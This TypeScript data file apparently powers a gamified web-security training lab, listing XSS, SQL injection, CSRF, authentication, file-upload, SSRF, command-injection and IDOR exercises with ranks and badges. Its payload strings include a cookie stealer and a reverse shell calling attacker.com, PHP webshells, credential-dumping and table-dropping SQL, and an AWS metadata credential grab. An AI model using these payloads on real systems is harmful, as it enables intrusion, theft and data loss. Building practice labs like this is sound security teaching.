// ============================================================
// labData.ts — All lab definitions, payloads, and metadata
// ============================================================

export type Difficulty = 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert';
export type AttackCategory = 'Injection' | 'XSS' | 'CSRF' | 'Auth' | 'Upload' | 'SSRF' | 'RCE' | 'IDOR';
export type Severity = 'Critical' | 'High' | 'Medium' | 'Low';

export interface Payload {
  id: string;
  name: string;
  payload: string;
  description: string;
  successCondition: string;
  xp: number;
}

export interface Lab {
  id: string;
  slug: string;
  title: string;
  subtitle: string;
  description: string;
  category: AttackCategory;
  difficulty: Difficulty;
  severity: Severity;
  xpReward: number;
  icon: string;
  color: string;
  tags: string[];
  payloads: Payload[];
  objectives: string[];
  hints: string[];
  cvss: number;
}

export const LABS: Lab[] = [
  {
    id: 'lab-xss',
    slug: 'xss',
    title: 'Cross-Site Scripting',
    subtitle: 'Reflected & Stored XSS',
    description: 'Inject malicious scripts into web pages viewed by other users. Steal cookies, hijack sessions, and deface sites.',
    category: 'XSS',
    difficulty: 'Beginner',
    severity: 'High',
    xpReward: 200,
    icon: '🎭',
    color: '#ffcc00',
    tags: ['XSS', 'DOM', 'Cookie Theft', 'Session Hijacking'],
    objectives: [
      'Inject a reflected XSS payload in the search bar',
      'Execute stored XSS via the comment system',
      'Steal the admin cookie using document.cookie',
      'Bypass basic XSS filters',
    ],
    hints: [
      'Try inserting <script>alert(1)</script> in the search box',
      'Use document.cookie to access session tokens',
      'Try img tags if script tags are filtered: <img src=x onerror=alert(1)>',
      'Stored XSS persists — inject in comments to affect all visitors',
    ],
    payloads: [
      { id: 'xss-1', name: 'Basic Alert', payload: "<script>alert('XSS')</script>", description: 'Classic script injection for testing', successCondition: 'reflected', xp: 40 },
      { id: 'xss-2', name: 'Cookie Stealer', payload: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", description: 'Exfiltrates session cookies', successCondition: 'cookie', xp: 60 },
      { id: 'xss-3', name: 'IMG Onerror', payload: "<img src=x onerror=alert('XSS bypassed!')>", description: 'Bypasses script-tag filters', successCondition: 'reflected', xp: 50 },
      { id: 'xss-4', name: 'SVG Inject', payload: "<svg onload=alert(document.domain)>", description: 'SVG-based XSS vector', successCondition: 'reflected', xp: 50 },
      { id: 'xss-5', name: 'Stored Comment XSS', payload: "<script>fetch('/admin/delete-all')</script>", description: 'Stored XSS attacking admin actions', successCondition: 'stored', xp: 80 },
      { id: 'xss-6', name: 'DOM-based XSS', payload: "javascript:void(document.write('<script>alert(1)</script>'))", description: 'DOM manipulation vector', successCondition: 'dom', xp: 70 },
    ],
    cvss: 7.4,
  },
  {
    id: 'lab-sqli',
    slug: 'sqli',
    title: 'SQL Injection',
    subtitle: 'Authentication Bypass & Data Dump',
    description: 'Exploit unsanitized SQL queries to bypass login, extract database contents, and escalate privileges.',
    category: 'Injection',
    difficulty: 'Beginner',
    severity: 'Critical',
    xpReward: 300,
    icon: '💉',
    color: '#ff3366',
    tags: ['SQLi', 'Auth Bypass', 'Data Exfiltration', 'UNION Attack'],
    objectives: [
      'Bypass the login form using SQL injection',
      'Extract the users table with UNION attack',
      'Retrieve password hashes from the database',
      'Escalate to admin privileges',
    ],
    hints: [
      "Try ' OR 1=1 -- in the username field",
      "The comment sequence -- terminates the rest of the SQL query",
      "UNION SELECT can extract data from other tables",
      "Try: ' UNION SELECT username,password FROM users --",
    ],
    payloads: [
      { id: 'sqli-1', name: 'Auth Bypass', payload: "' OR 1=1 --", description: 'Classic authentication bypass', successCondition: 'auth_bypass', xp: 60 },
      { id: 'sqli-2', name: 'Always True', payload: "admin' --", description: 'Log in as admin without password', successCondition: 'auth_bypass', xp: 50 },
      { id: 'sqli-3', name: 'UNION Dump', payload: "' UNION SELECT 1,username,password FROM users --", description: 'Dump credentials from users table', successCondition: 'data_dump', xp: 80 },
      { id: 'sqli-4', name: 'Error-Based', payload: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --", description: 'Extract data through error messages', successCondition: 'error_based', xp: 90 },
      { id: 'sqli-5', name: 'Blind SQLi', payload: "' AND SLEEP(5) --", description: 'Time-based blind injection', successCondition: 'blind', xp: 100 },
      { id: 'sqli-6', name: 'Stacked Query', payload: "'; DROP TABLE sessions; --", description: 'Execute multiple statements (WARNING: destructive)', successCondition: 'stacked', xp: 120 },
    ],
    cvss: 9.8,
  },
  {
    id: 'lab-csrf',
    slug: 'csrf',
    title: 'CSRF Attack',
    subtitle: 'Cross-Site Request Forgery',
    description: 'Forge authenticated requests from a victim\'s browser to perform unauthorized actions like fund transfers.',
    category: 'CSRF',
    difficulty: 'Intermediate',
    severity: 'High',
    xpReward: 250,
    icon: '🏦',
    color: '#00d4ff',
    tags: ['CSRF', 'Token Bypass', 'Social Engineering', 'Banking'],
    objectives: [
      'Forge a fund transfer request from the victim\'s bank account',
      'Bypass the weak CSRF token implementation',
      'Craft a malicious HTML page that auto-submits',
      'Exfiltrate victim account data via CSRF',
    ],
    hints: [
      'CSRF works because browsers automatically send cookies with requests',
      'Look for missing or predictable CSRF tokens',
      'A hidden auto-submitting form can trigger the attack silently',
      'The attack page must be hosted on a different origin',
    ],
    payloads: [
      { id: 'csrf-1', name: 'Transfer Forge', payload: '<form action="/bank/transfer" method="POST"><input name="to" value="attacker_acc"><input name="amount" value="10000"><input type="submit"></form><script>document.forms[0].submit()</script>', description: 'Auto-submitting transfer form', successCondition: 'transfer', xp: 80 },
      { id: 'csrf-2', name: 'GET-based CSRF', payload: '<img src="https://bank.com/transfer?to=attacker&amount=5000">', description: 'State-changing GET request exploit', successCondition: 'transfer', xp: 60 },
      { id: 'csrf-3', name: 'Token Bypass', payload: "csrf_token=PREDICT&amount=9999", description: 'Predictable token bypass', successCondition: 'token_bypass', xp: 100 },
    ],
    cvss: 8.1,
  },
  {
    id: 'lab-auth',
    slug: 'broken-auth',
    title: 'Broken Authentication',
    subtitle: 'Session Hijacking & Brute Force',
    description: 'Exploit weak authentication mechanisms including brute-force attacks, session fixation, and credential stuffing.',
    category: 'Auth',
    difficulty: 'Intermediate',
    severity: 'Critical',
    xpReward: 280,
    icon: '🔓',
    color: '#a855f7',
    tags: ['Brute Force', 'Session Fixation', 'JWT Bypass', 'MFA Bypass'],
    objectives: [
      'Brute-force the admin password',
      'Exploit the "Remember Me" cookie to hijack a session',
      'Forge a JWT token with alg:none',
      'Bypass 2FA using a race condition',
    ],
    hints: [
      'Common passwords: admin, password123, letmein',
      'The remember_me cookie is base64 encoded — decode it',
      'JWT with alg:none skips signature verification',
      "Try changing the user ID in the session cookie",
    ],
    payloads: [
      { id: 'auth-1', name: 'Common Password', payload: 'admin:password123', description: 'Credential stuffing with common passwords', successCondition: 'login', xp: 40 },
      { id: 'auth-2', name: 'JWT None Attack', payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', description: 'JWT with alg:none header', successCondition: 'jwt_bypass', xp: 100 },
      { id: 'auth-3', name: 'Session Fixation', payload: 'SESSIONID=ATTACKER_CONTROLLED_VALUE', description: 'Fix session ID before auth', successCondition: 'session_fix', xp: 80 },
      { id: 'auth-4', name: 'Cookie Tamper', payload: 'user=admin; role=superadmin; remember=1', description: 'Tamper with session cookie values', successCondition: 'privilege_esc', xp: 90 },
    ],
    cvss: 9.1,
  },
  {
    id: 'lab-upload',
    slug: 'file-upload',
    title: 'File Upload Vulnerability',
    subtitle: 'Remote Code Execution via Upload',
    description: 'Upload malicious files to achieve remote code execution on the server by bypassing extension and MIME-type checks.',
    category: 'Upload',
    difficulty: 'Advanced',
    severity: 'Critical',
    xpReward: 350,
    icon: '📁',
    color: '#ff6600',
    tags: ['RCE', 'Webshell', 'MIME Bypass', 'Extension Bypass'],
    objectives: [
      'Upload a PHP webshell disguised as an image',
      'Bypass extension blacklisting (try .php5, .phtml)',
      'Bypass MIME-type validation with magic bytes',
      'Execute OS commands via the uploaded file',
    ],
    hints: [
      'Try renaming evil.php to evil.php.jpg',
      'Change Content-Type to image/png while keeping .php extension',
      "PHP5, phtml, phar extensions may be allowed",
      'Add image magic bytes (FF D8 FF) before PHP code',
    ],
    payloads: [
      { id: 'upload-1', name: 'Simple Webshell', payload: '<?php system($_GET["cmd"]); ?>', description: 'One-liner PHP remote code execution', successCondition: 'rce', xp: 100 },
      { id: 'upload-2', name: 'MIME Bypass', payload: 'GIF89a;\n<?php system($_GET["cmd"]); ?>', description: 'GIF magic bytes + PHP code', successCondition: 'rce', xp: 120 },
      { id: 'upload-3', name: 'Double Extension', payload: 'shell.php.jpg', description: 'Double extension bypass', successCondition: 'upload', xp: 80 },
    ],
    cvss: 9.9,
  },
  {
    id: 'lab-ssrf',
    slug: 'ssrf',
    title: 'Server-Side Request Forgery',
    subtitle: 'Internal Network Pivoting',
    description: 'Trick the server into making requests to internal services, AWS metadata endpoints, and internal admin panels.',
    category: 'SSRF',
    difficulty: 'Advanced',
    severity: 'Critical',
    xpReward: 400,
    icon: '🌐',
    color: '#00ff88',
    tags: ['SSRF', 'Cloud Metadata', 'Internal Network', 'AWS'],
    objectives: [
      'Access the internal admin panel at 127.0.0.1',
      'Read AWS EC2 metadata via SSRF',
      'Bypass URL filters using DNS rebinding',
      'Pivot to internal services on port 8080',
    ],
    hints: [
      'Try http://127.0.0.1/admin or http://localhost:8080',
      "AWS metadata is at http://169.254.169.254/latest/meta-data/",
      'Try http://[::1]/ to bypass localhost filters',
      "Use http://0.0.0.0/ as an alternative to localhost",
    ],
    payloads: [
      { id: 'ssrf-1', name: 'Localhost Admin', payload: 'http://127.0.0.1/admin', description: 'Access internal admin panel', successCondition: 'internal', xp: 80 },
      { id: 'ssrf-2', name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', description: 'Steal cloud credentials', successCondition: 'aws', xp: 120 },
      { id: 'ssrf-3', name: 'Port Scan', payload: 'http://192.168.1.1:22', description: 'Scan internal network ports via SSRF', successCondition: 'scan', xp: 100 },
    ],
    cvss: 9.3,
  },
  {
    id: 'lab-cmdi',
    slug: 'command-injection',
    title: 'Command Injection',
    subtitle: 'OS Command Execution',
    description: 'Inject OS commands into web application inputs that are passed unsanitized to system shell functions.',
    category: 'RCE',
    difficulty: 'Advanced',
    severity: 'Critical',
    xpReward: 380,
    icon: '💻',
    color: '#ff3366',
    tags: ['RCE', 'Shell Injection', 'Reverse Shell', 'Privilege Escalation'],
    objectives: [
      'Execute whoami via the ping utility',
      'Read /etc/passwd using command chaining',
      'Establish a reverse shell connection',
      'Escalate privileges using SUID binaries',
    ],
    hints: [
      "Use ; to chain commands: 127.0.0.1; whoami",
      "| pipes output: 127.0.0.1 | cat /etc/passwd",
      "Try && for conditional execution",
      "Backticks also execute commands: `id`",
    ],
    payloads: [
      { id: 'cmdi-1', name: 'Whoami', payload: '127.0.0.1; whoami', description: 'Identify current user', successCondition: 'whoami', xp: 60 },
      { id: 'cmdi-2', name: 'Read Passwd', payload: '127.0.0.1 | cat /etc/passwd', description: 'Read system password file', successCondition: 'file_read', xp: 80 },
      { id: 'cmdi-3', name: 'Reverse Shell', payload: '127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1', description: 'Establish reverse shell', successCondition: 'revshell', xp: 150 },
    ],
    cvss: 10.0,
  },
  {
    id: 'lab-idor',
    slug: 'idor',
    title: 'IDOR',
    subtitle: 'Insecure Direct Object Reference',
    description: 'Access other users\' data by manipulating object references like user IDs, file names, and order numbers.',
    category: 'IDOR',
    difficulty: 'Intermediate',
    severity: 'High',
    xpReward: 230,
    icon: '👤',
    color: '#a855f7',
    tags: ['IDOR', 'Access Control', 'Data Leakage', 'API Abuse'],
    objectives: [
      'Access another user\'s profile by changing the ID',
      'Download a private file belonging to user #1',
      'View admin\'s orders by manipulating order IDs',
      'Escalate your account to admin via parameter tampering',
    ],
    hints: [
      "Change /api/users/5 to /api/users/1 to get admin data",
      "Try sequential IDs: 1, 2, 3...",
      "Check URL parameters for user_id, account_id, doc_id",
      "API endpoints are often more vulnerable than web pages",
    ],
    payloads: [
      { id: 'idor-1', name: 'User ID Tamper', payload: '/api/users/1', description: 'Access admin user profile', successCondition: 'user_access', xp: 60 },
      { id: 'idor-2', name: 'File Access', payload: '/api/files/private_admin_report.pdf', description: 'Download restricted file', successCondition: 'file_access', xp: 80 },
      { id: 'idor-3', name: 'Order Enum', payload: '/api/orders/1001', description: 'View other users orders', successCondition: 'order_access', xp: 70 },
    ],
    cvss: 7.5,
  },
];

export const RANKS = [
  { name: 'Script Kiddie', minXP: 0, maxXP: 299, color: '#94a3b8', icon: '🐣' },
  { name: 'Novice Hacker', minXP: 300, maxXP: 699, color: '#00d4ff', icon: '🎯' },
  { name: 'Penetration Tester', minXP: 700, maxXP: 1299, color: '#00ff88', icon: '🔍' },
  { name: 'Red Teamer', minXP: 1300, maxXP: 2199, color: '#ffcc00', icon: '⚔️' },
  { name: 'Bug Hunter', minXP: 2200, maxXP: 3499, color: '#ff6600', icon: '🐛' },
  { name: 'Elite Hacker', minXP: 3500, maxXP: 5999, color: '#a855f7', icon: '💀' },
  { name: 'Zero Day King', minXP: 6000, maxXP: Infinity, color: '#ff3366', icon: '👑' },
];

export const BADGES = [
  { id: 'first-blood', name: 'First Blood', description: 'Complete your first attack', icon: '🩸', xp: 50 },
  { id: 'xss-lord', name: 'XSS Lord', description: 'Complete all XSS challenges', icon: '🎭', xp: 100 },
  { id: 'sqli-master', name: 'SQLi Master', description: 'Dump the entire database', icon: '💉', xp: 150 },
  { id: 'session-thief', name: 'Session Thief', description: 'Steal an admin cookie', icon: '🍪', xp: 75 },
  { id: 'rce-god', name: 'RCE God', description: 'Execute a reverse shell', icon: '🔥', xp: 200 },
  { id: 'web-ninja', name: 'Web Ninja', description: 'Complete 5 labs', icon: '🥷', xp: 250 },
  { id: 'speed-runner', name: 'Speed Runner', description: 'Complete a lab in under 2 minutes', icon: '⚡', xp: 100 },
  { id: 'no-hints', name: 'Self-Taught', description: 'Complete a lab without hints', icon: '🧠', xp: 150 },
];
